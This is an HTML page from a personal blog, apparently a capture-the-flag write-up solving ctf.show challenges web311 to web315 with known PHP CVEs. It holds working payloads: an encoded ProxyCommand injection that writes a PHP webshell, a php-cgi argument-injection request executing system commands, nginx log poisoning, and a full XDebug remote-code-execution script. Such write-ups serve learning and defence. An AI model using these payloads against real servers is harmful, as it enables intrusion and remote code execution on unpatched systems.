@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html data-theme="">
+<head>
+    <!-- ! 引用文件位置-->
+    <!--引用文件位置-->
+<meta charset="utf-8">
+<title>原神，启动！！</title>
+<!--    daisyui cdn-->
+<link href="https://cdn.jsdelivr.net/npm/daisyui@4.5.0/dist/full.min.css" rel="stylesheet" type="text/css"/>
+<!--     tailwindcss cdn daisyui 前置-->
+<script src="https://cdn.tailwindcss.com"></script>
+<!--    更改主题颜色-->
+<script src="https://cdn.jsdelivr.net/npm/theme-change@2.0.2/index.js"></script>
+<!--自动排版-->
+<!--    <link rel="stylesheet" href="https://unpkg.com/@tailwindcss/typography@^0.4.0/dist/typography.min.css" type="text/css">-->
+<script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+<!--    谷歌字体库镜像-->
+<style>
+    @import url('https://fonts.font.im/css?family=Barlow:700|Bitter');
+</style>
+<!--jquery-->
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<!--    fancybox-->
+<link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" type="text/css">
+<script src="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+<!--highlight 代码高亮 使用hexo的不会高亮-->
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+<script>
+    hljs.highlightAll();
+</script>
+<link rel="stylesheet"
+      href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/styles/vs2015.min.css">
+<!--    自定义css-->
+
+<link rel="stylesheet" href="/css/output.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+<!--    自定义js-->
+
+<script src="/js/view.js"></script>
+
+
+<script src="/js/fancybox.js"></script>
+
+<!--去除referrer检测 要写在head里面 但是似乎影响进站查看-->
+<meta name="referrer" content="no-referrer"/>
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+<!--导航栏-->
+<div class="">
+    <div class="container-nav justify-center flex">
+        <div class="navbar bg-base-100 shadow-xl rounded-box w-10/12 my-6 z-10">
+            <div class="flex-1">
+                <a class="btn btn-ghost text-xl" href="/">原神，启动！</a>
+            </div>
+            <div class="flex-none gap-2">
+                <ul class="menu menu-horizontal px-1">
+                    
+                    
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/">首页</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/archives">文章</a></li>
+                        
+                            <!--去掉最后一位是，-->
+                            <li><a href="/about">关于</a></li>
+                        
+                    
+                    <!--<li><a href="/">Home</a></li>-->
+                    <!--<li><a href="/archives">Archive</a></li>-->
+                    <!--<li><a href="/about/">About</a></li>-->
+                    <li>
+                        <details class="dropdown">
+                            <summary>
+                                更换主题
+                            </summary>
+                            <ul tabindex="0"
+                                class="dropdown-content z-[1] p-2 bg-base-100 rounded-box w-58 max-h-96 overflow-y-auto overflow-x-hidden shadow">
+                                <!--                                <li><a class="border-base-content/20 hover:border-base-content/40 overflow-hidden rounded-lg border outline outline-2 outline-offset-2 outline-transparent !outline-base-content" data-set-theme="emerald" data-act-class="!outline-base-content"><div data-theme="emerald" class="bg-base-100 text-base-content w-full cursor-pointer font-sans"><div class="grid grid-cols-5 grid-rows-3"><div class="bg-base-200 col-start-1 row-span-2 row-start-1"></div> <div class="bg-base-300 col-start-1 row-start-3"></div> <div class="bg-base-100 col-span-4 col-start-2 row-span-3 row-start-1 flex flex-col gap-1 p-2"><div class="font-bold">emerald</div> <div class="flex flex-wrap gap-1"><div class="bg-primary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-primary-content text-sm font-bold">A</div></div> <div class="bg-secondary flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-secondary-content text-sm font-bold">A</div></div> <div class="bg-accent flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-accent-content text-sm font-bold">A</div></div> <div class="bg-neutral flex aspect-square w-5 items-center justify-center rounded lg:w-6"><div class="text-neutral-content text-sm font-bold">A</div></div></div></div></div></div> </a></li>-->
+                                <!--主题选择配置，主题来自daisyui-->
+
+<li><a data-set-theme="light">Light</a></li>
+<li><a data-set-theme="dark">Night</a></li>
+<li><a data-set-theme="cupcake">Cupcake</a></li>
+<li><a data-set-theme="bumblebee">Bumblebee</a></li>
+<li><a data-set-theme="emerald">Emerald</a></li>
+<li><a data-set-theme="coporate">Corporate</a></li>
+<li><a data-set-theme="synthwave">Synthwave</a></li>
+<li><a data-set-theme="retro">Retro</a></li>
+<li><a data-set-theme="cyberpunk">Cyberpunk</a></li>
+<li><a data-set-theme="halloween">Halloween</a></li>
+<li><a data-set-theme="garden">Garden</a></li>
+<li><a data-set-theme="forest">Forest</a></li>
+<li><a data-set-theme="aqua">Aqua</a></li>
+<li><a data-set-theme="lofi">Lo-fi</a></li>
+<li><a data-set-theme="pastel">Pastel</a></li>
+<li><a data-set-theme="fantasy">Fantasy</a></li>
+<li><a data-set-theme="wireframe">Wireframe</a></li>
+<li><a data-set-theme="black">Black</a></li>
+<li><a data-set-theme="luxury">Luxury</a></li>
+<li><a data-set-theme="dracula">Dracula</a></li>
+<li><a data-set-theme="cmyk">CMYK</a></li>
+<li><a data-set-theme="autumn">Autumn</a></li>
+<li><a data-set-theme="business">Business</a></li>
+<li><a data-set-theme="acid">Acid</a></li>
+<li><a data-set-theme="lemonade">Lemonade</a></li>
+<li><a data-set-theme="night">Night</a></li>
+<li><a data-set-theme="coffee">Coffee</a></li>
+<li><a data-set-theme="winter">Winter</a></li>
+<li><a data-set-theme="dim">Dim</a></li>
+<li><a data-set-theme="nord">Nord</a></li>
+<li><a data-set-theme="sunset">Sunset</a></li>
+                            </ul>
+                        </details>
+                    </li>
+                </ul>
+                <div class="form-control">
+                    <input type="text" placeholder="Search is not yet!" class="input input-bordered w-24 md:w-auto"/>
+                </div>
+                <div class="dropdown dropdown-end">
+                    <div tabindex="0" role="button" class="btn btn-ghost btn-circle avatar">
+                        <div class="w-10 rounded-full">
+                            <img alt="Tailwind CSS Navbar component"
+                                 src="https://s3.bmp.ovh/imgs/2023/03/12/d3fe3843da0a1878.jpg"/>
+                        </div>
+                    </div>
+                    <!--TODO 完成这里-->
+                    <!--<ul tabindex="0"-->
+                    <!--    class="mt-3 z-[1] p-2 shadow menu menu-sm dropdown-content bg-base-100 rounded-box w-52">-->
+                    <!--    <li>-->
+                    <!--        <a class="justify-between">-->
+                    <!--            Profile-->
+                    <!--            <span class="badge">New</span>-->
+                    <!--        </a>-->
+                    <!--    </li>-->
+                    <!--    <li><a>Settings</a></li>-->
+                    <!--    <li><a>Logout</a></li>-->
+                    <!--</ul>-->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!--导航栏结束-->
+<div class="fleet">
+    <!--    嵌套位置-->
+    <!-- 博客详情 -->
+
+
+<!--Post开始-->
+<div class="fleet container-nav justify-center flex mb-16 w-full">
+    <div class="w-8/12 justify-center flex">
+        <div class="fleet-body flex-col w-full">
+            <div class="fleet-header">
+                <div class="fleet-content-header-title text-6xl">
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">web311-web315phpCVE</h1>
+                </div>
+                <div class="fleet-content-header-info">
+                    <span>2023/12/08 14:46:29</span>
+                </div>
+            </div>
+            <div class="divider w-full"></div>
+            <div class="fleet-content mt-8">
+                <div class="fleet-content-body">
+                    <div class="fleet-content-body-content justify-center flex w-full">
+                        
+                        <!--代码块-->
+                        <!--高亮使用的prismjs需要将class中的python改为language-python-->
+                        
+                        <!--图片-->
+                        
+                        <article class="prose">
+                            <h1 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h1><h3 id="CVE-2019-11043远程代码执行漏洞"><a href="#CVE-2019-11043远程代码执行漏洞" class="headerlink" title="CVE-2019-11043远程代码执行漏洞"></a>CVE-2019-11043远程代码执行漏洞</h3><p>抓包，版本7.1.33。<br>这个复现得需要go环境，装一下：<br><code>sudo apt install golang</code></p>
+<pre class="language-php" data-language="php"><code class="language-php">git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.git
+cd phuip-fpizdam
+go get -v &amp;&amp; go build</code></pre>
+<p>执行go get -v &amp;&amp; go build会一直没反应<br>因为go proxy默认为proxy.golang.org，国内无法访问<br>执行命令换代理：go env -w GOPROXY&#x3D;<a target="_blank" rel="noopener" href="https://goproxy.cn/">https://goproxy.cn</a><br>再次执行go get -v &amp;&amp; go build<br>最后使用：</p>
+<pre class="language-php" data-language="php"><code class="language-php">go run . &quot;地址&#x2F;index.php&quot;</code></pre>
+<p>末尾的index.php必须要加。<br>我再本地搭的用不了，拿vps打了一下就能用了。</p>
+<pre class="language-php" data-language="php"><code class="language-php">root@hcss-ecs-8320:~&#x2F;phui&#x2F;phuip-fpizdam# go run . &quot;http:&#x2F;&#x2F;24f960ac-d8d8-45be-8ba0-f5bb12ba5cb1.challenge.ctf.show&#x2F;index.php&quot;
+2023&#x2F;09&#x2F;17 20:37:46 Base status code is 200
+2023&#x2F;09&#x2F;17 20:37:49 Status code 502 for qsl&#x3D;1765, adding as a candidate
+2023&#x2F;09&#x2F;17 20:37:50 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
+2023&#x2F;09&#x2F;17 20:38:10 Attack params found: --qsl 1760 --pisos 237 --skip-detect
+2023&#x2F;09&#x2F;17 20:38:10 Trying to set &quot;session.auto_start&#x3D;0&quot;...
+2023&#x2F;09&#x2F;17 20:38:12 Detect() returned attack params: --qsl 1760 --pisos 237 --skip-detect &lt;-- REMEMBER THIS
+2023&#x2F;09&#x2F;17 20:38:12 Performing attack using php.ini settings...
+2023&#x2F;09&#x2F;17 20:38:14 Success! Was able to execute a command by appending &quot;?a&#x3D;&#x2F;bin&#x2F;sh+-c+&#39;which+which&#39;&amp;&quot; to URLs
+2023&#x2F;09&#x2F;17 20:38:14 Trying to cleanup &#x2F;tmp&#x2F;a...
+2023&#x2F;09&#x2F;17 20:38:14 Done!</code></pre>
+<p>之后传入参后不是每次都可以执行，需要多次尝试。<br>GET给a传入linux命令就行了。</p>
+<h1 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h1><h3 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h3><blockquote>
+<p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian&#x2F;ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置-oProxyCommand&#x3D;来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+</blockquote>
+<p>php5.6.38<br>先抓包，然后对payload进行修改。</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php eval($_POST[1]);?&gt;
+base64加密一下，并添加：
+echo &quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot; | base64 -d &gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php
+在进行一次base64加密：
+ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA&#x3D;&#x3D;
+再进行url编码
+ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA%3D%3D</code></pre>
+<p>然后将hostname的内容修改为：</p>
+<pre class="language-php" data-language="php"><code class="language-php">x+-oProxyCommand%3decho%09编码后的内容|base64%09-d|sh&#125;a</code></pre>
+<p>也就是payload：</p>
+<pre class="language-php" data-language="php"><code class="language-php">x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA|base64%09-d|sh&#125;a</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php">POST &#x2F; HTTP&#x2F;1.1
+Host: eeb206e9-41fa-4de4-a081-fd0d924d3284.challenge.ctf.show
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko&#x2F;20100101 Firefox&#x2F;65.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Referer: http:&#x2F;&#x2F;eeb206e9-41fa-4de4-a081-fd0d924d3284.challenge.ctf.show&#x2F;
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 180
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+hostname&#x3D;x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA|base64%09-d|sh&#125;a&amp;username&#x3D;123&amp;password&#x3D;123</code></pre>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694956213914-49a80688-3d4b-4851-b44e-25c2bce60139.png" alt="image.png"><br>虽然报错但是已经将马写进去了。<br>然后传参即可：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694956313975-38a36cea-bf6f-4341-8306-d7a229240a96.png" alt="image.png"></p>
+<h1 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html</a></p>
+</blockquote>
+<h3 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h3><p>cgi模式下有如下一些参数可用：</p>
+<ul>
+<li>-c 指定php.ini文件的位置</li>
+<li>-n 不要加载php.ini文件</li>
+<li>-d 指定配置项</li>
+<li>-b 启动fastcgi进程</li>
+<li>-s 显示文件源码</li>
+<li>-T 执行指定次该文件</li>
+<li>-h和-? 显示帮助</li>
+</ul>
+<p>使用方法比如就是<code>?-s</code>显示源码。<br>poc：</p>
+<pre class="language-php" data-language="php"><code class="language-php">POST &#x2F;index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a&#x2F;&#x2F;input HTTP&#x2F;1.1
+Host: 7bdb7492-e4fc-40cf-94ab-84870c199bca.challenge.ctf.show
+Accept: *&#x2F;*
+Accept-Language: en
+User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)
+Connection: close
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 29
+
+&lt;?php echo system(&quot;ls&quot;); ?&gt;</code></pre>
+<h1 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h1><h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>目录穿越一下先。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695117285137-df0dc08d-7014-473c-a2ae-f1a0fac66aaa.png" alt="image.png"><br>nginx读一下日志。<code>/var/log/nginx/access.log</code><br>能正常访问，直接写马。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695117477277-905c3686-1644-422f-925c-68bc22ffc2d2.png" alt="image.png"></p>
+<h1 id="web315（没成功）"><a href="#web315（没成功）" class="headerlink" title="web315（没成功）"></a>web315（没成功）</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.ricterz.me/posts/Xdebug:%20A%20Tiny%20Attack%20Surface">https://blog.ricterz.me/posts/Xdebug:%20A%20Tiny%20Attack%20Surface</a></p>
+</blockquote>
+<h3 id="XDebug-远程调试漏洞"><a href="#XDebug-远程调试漏洞" class="headerlink" title="XDebug 远程调试漏洞"></a>XDebug 远程调试漏洞</h3><p>PHP&#x2F;7.1.12，XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back &#x3D; 1：</p>
+<pre class="language-php" data-language="php"><code class="language-php">xdebug.remote_connect_back &#x3D; 1
+xdebug.remote_enable &#x3D; 1</code></pre>
+<p>这个配置下，我们访问<a target="_blank" rel="noopener" href="http://target/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82">http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</a><br>漏洞利用：<br>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞<br>有已经编写好的脚本：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py</a></p>
+<pre class="language-php" data-language="php"><code class="language-php">#!&#x2F;usr&#x2F;bin&#x2F;env python3
+import re
+import sys
+import time
+import requests
+import argparse
+import socket
+import base64
+import binascii
+from concurrent.futures import ThreadPoolExecutor
+
+
+pool &#x3D; ThreadPoolExecutor(1)
+session &#x3D; requests.session()
+session.headers &#x3D; &#123;
+    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)&#39;
+&#125;
+
+def recv_xml(sock):
+    blocks &#x3D; []
+    data &#x3D; b&#39;&#39;
+    while True:
+        try:
+            data &#x3D; data + sock.recv(1024)
+        except socket.error as e:
+            break
+        if not data:
+            break
+
+        while data:
+            eop &#x3D; data.find(b&#39;\x00&#39;)
+            if eop &lt; 0:
+                break
+            blocks.append(data[:eop])
+            data &#x3D; data[eop+1:]
+
+        if len(blocks) &gt;&#x3D; 4:
+            break
+    
+    return blocks[3]
+
+
+def trigger(url):
+    time.sleep(2)
+    try:
+        session.get(url + &#39;?XDEBUG_SESSION_START&#x3D;phpstorm&#39;, timeout&#x3D;0.1)
+    except:
+        pass
+
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    parser &#x3D; argparse.ArgumentParser(description&#x3D;&#39;XDebug remote debug code execution.&#39;)
+    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, required&#x3D;True, help&#x3D;&#39;the code you want to execute.&#39;)
+    parser.add_argument(&#39;-t&#39;, &#39;--target&#39;, required&#x3D;True, help&#x3D;&#39;target url.&#39;)
+    parser.add_argument(&#39;-l&#39;, &#39;--listen&#39;, default&#x3D;9000, type&#x3D;int, help&#x3D;&#39;local port&#39;)
+    args &#x3D; parser.parse_args()
+    
+    ip_port &#x3D; (&#39;0.0.0.0&#39;, args.listen)
+    sk &#x3D; socket.socket()
+    sk.settimeout(10)
+    sk.bind(ip_port)
+    sk.listen(5)
+
+    pool.submit(trigger, args.target)
+    conn, addr &#x3D; sk.accept()
+    conn.sendall(b&#39;&#39;.join([b&#39;eval -i 1 -- &#39;, base64.b64encode(args.code.encode()), b&#39;\x00&#39;]))
+
+    data &#x3D; recv_xml(conn)
+    print(&#39;[+] Recieve data: &#39; + data.decode())
+    g &#x3D; re.search(rb&#39;&lt;\!\[CDATA\[([a-z0-9&#x3D;\.&#x2F;\+]+)\]\]&gt;&#39;, data, re.I)
+    if not g:
+        print(&#39;[-] No result...&#39;)
+        sys.exit(0)
+
+    data &#x3D; g.group(1)
+
+    try:
+        print(&#39;[+] Result: &#39; + base64.b64decode(data).decode())
+    except binascii.Error:
+        print(&#39;[-] May be not string result...&#39;)</code></pre>
+<p>部署一下尝试</p>
+<pre class="language-php" data-language="php"><code class="language-php">root@hcss-ecs-8320:~&#x2F;test# python3 exp.py -t http:&#x2F;&#x2F;pwn.challenge.ctf.show:28100&#x2F; -c &#39;shell_exec(&quot;ls &#x2F;&quot;);&#39;
+Traceback (most recent call last):
+  File &quot;&#x2F;root&#x2F;test&#x2F;exp.py&quot;, line 65, in &lt;module&gt;
+    conn, addr &#x3D; sk.accept()
+  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3.10&#x2F;socket.py&quot;, line 293, in accept
+    fd, addr &#x3D; self._accept()
+TimeoutError: timed out
+</code></pre>
+<p>可能是环境出问题了，没有复现成功。</p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/12b4f39f/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web334-w</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/d7d45c8a/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>web316-web333XSS篇</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
